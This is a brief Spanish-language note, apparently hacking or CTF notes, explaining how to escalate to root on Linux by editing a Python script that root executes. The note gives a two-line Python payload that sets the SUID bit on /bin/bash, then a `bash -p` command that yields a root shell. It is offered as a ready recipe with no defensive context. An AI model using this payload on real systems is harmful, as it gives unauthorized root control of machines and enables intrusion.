Para poder escalar los privilegios sin tener la contraseña root, nos hace falta el poder de modificar un archivo que sea python y que el root lo ejecute.

Siempre es el mismo código:

`import os`
`os.system("chmod u+s /bin/bash")`

Si el usuario root ejecuta este código, y posteriormente nosotros (en usuario normal) ejecutamos un:

`bash -p`

Ya estamos dentro.